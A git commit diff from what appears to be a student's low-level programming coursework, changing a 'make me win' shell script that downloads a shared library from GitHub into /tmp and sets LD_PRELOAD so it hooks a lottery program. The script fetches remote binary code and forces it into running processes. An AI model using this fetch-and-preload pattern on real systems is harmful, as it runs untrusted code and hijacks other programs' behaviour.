5d5b810d2d9533262bb908af07e69a5b37018c8e
Dukurma <barryyabilsu@gmail.com>
2023-03-23 16:07:02 -0700

    p0t_0f_g0ld

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -P /tmp https://github.com/Dukurma/alx-low_level_programming/raw/master/0x18-dynamic_libraries/jack.so
-export LD_PRELOAD=/tmp/jack.so
+wget -P /tmp https://github.com/Dukurma/alx-low_level_programming/raw/master/0x18-dynamic_libraries/potofgold.so
+export LD_PRELOAD=/tmp/potofgold.so
